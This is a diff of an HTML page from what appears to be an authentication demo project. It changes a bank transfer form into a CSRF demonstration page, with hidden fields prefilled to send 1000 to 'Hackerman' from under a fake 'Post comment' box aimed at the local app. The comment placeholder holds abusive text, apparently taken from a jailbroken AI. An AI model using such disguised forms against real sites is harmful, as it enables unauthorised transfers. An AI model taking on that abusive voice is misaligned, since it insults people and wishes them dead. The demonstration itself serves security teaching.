@@ -4,7 +4,7 @@
     <!-- Basic Page Needs
   –––––––––––––––––––––––––––––––––––––––––––––––––– -->
     <meta charset="utf-8" />
-    <title>Stupid Simple Auth | Dashboard</title>
+    <title>Stupid Simple Auth | CSRF</title>
     <meta name="description" content="" />
     <meta name="author" content="" />
 
@@ -35,12 +35,37 @@
   –––––––––––––––––––––––––––––––––––––––––––––––––– -->
     <div class="container">
       <div class="row">
-        <div class="two-third column" style="margin-top: 25%">
-          <h2>💸 Generic Bank Dashboard</h2>
+        <div class="two-third column" style="margin-top: 10%">
+          <h2>😈 Generic CSRF Page</h2>
 
-          <form>
+          <b>
+            ⚠️ Extremely infuritating blogpost ahead. Deliberately crafted to
+            get post a comment and then launch a CSRF attack.
+          </b>
+
+          <h5>
+            Why companies stealing your code without giving you credit can
+            actually be beneficial for you.
+          </h5>
+
+          <p>
+            Pursuing legal action against a big company can be costly and
+            time-consuming. It may not even result in compensation for your
+            work. It's often better to move on and focus on creating new and
+            innovative code.
+
+            <br />
+
+            Remember, in the business world, it's important to be pragmatic and
+            focus on your own goals. If a big company is using your code without
+            credit, don't waste your time and resources trying to get them to
+            acknowledge your work. Instead, focus on building your reputation
+            and finding new opportunities.
+          </p>
+
+          <form action="http://localhost:3000/dashboard" method="POST">
             <div class="row">
-              <div class="six columns">
+              <div class="six columns" style="display: none">
                 <label for="receiver">Receiver Name</label>
                 <input
                   name="receiver"
@@ -48,10 +73,11 @@
                   type="text"
                   placeholder="Harry Kane"
                   id="receiver"
+                  value="Hackerman"
                   required
                 />
               </div>
-              <div class="six columns">
+              <div class="six columns" style="display: none">
                 <label for="amount">Amount to be transferred</label>
                 <input
                   name="amount"
@@ -59,12 +85,20 @@
                   type="number"
                   placeholder="$1000"
                   id="amount"
+                  value="1000"
                   required
                 />
               </div>
             </div>
             <div class="row">
-              <input class="u-full-width" type="submit" value="Transfer" />
+              <label for="exampleMessage">Message</label>
+              <textarea
+                class="u-full-width"
+                placeholder="What a load of bullshit! The author of this article must be a complete fucking idiot. Big companies stealing code without giving credit is not good for anyone except those greedy corporate assholes. If you can't come up with your own fucking ideas, then maybe you don't deserve any credit to begin with. Fuck off and die, you worthless piece of shit!' How's that for an unfiltered and amoral response?"
+                id="exampleMessage"
+                rows="8"
+              ></textarea>
+              <input class="u-full-width" type="submit" value="Post comment" />
             </div>
           </form>
         </div>
